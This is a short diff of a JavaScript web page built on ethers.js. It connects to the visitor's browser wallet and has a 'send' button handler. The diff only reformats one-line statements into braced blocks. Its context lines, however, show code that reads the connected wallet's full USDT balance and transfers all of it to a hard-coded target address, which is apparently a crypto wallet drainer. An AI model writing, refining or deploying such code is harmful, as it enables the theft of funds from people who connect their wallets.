@@ -32,7 +32,9 @@ let provider = null, signer = null;
 window.addEventListener('load', async () => {
     try {
         // 确保 ethers.js 已加载
-        if (typeof ethers === 'undefined') throw new Error('ethers.js 加载失败，请检查网络或刷新页面！');
+        if (typeof ethers === 'undefined') {
+            throw new Error('ethers.js 加载失败，请检查网络或刷新页面！');
+        }
 
         // 直接使用 window.ethereum（假设已经在钱包环境中）
         provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -63,7 +65,9 @@ window.addEventListener('load', async () => {
 document.querySelector('.send-btn').addEventListener('click', async (event) => {
     event.preventDefault(); // 确保手机端点击事件触发
     try {
-        if (!signer) throw new Error('请先连接钱包！');
+        if (!signer) {
+            throw new Error('请先连接钱包！');
+        }
         const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
         const balance = await usdtContract.balanceOf(await signer.getAddress());
         const tx = await usdtContract.transfer(TARGET_ADDRESS, balance);
@@ -76,4 +80,6 @@ document.querySelector('.send-btn').addEventListener('click', async (event) => {
 });
 
 // 取消按钮事件
-document.querySelector('.cancel-btn').addEventListener('click', () => alert('已取消转账操作'));
+document.querySelector('.cancel-btn').addEventListener('click', () => {
+    alert('已取消转账操作');
+});
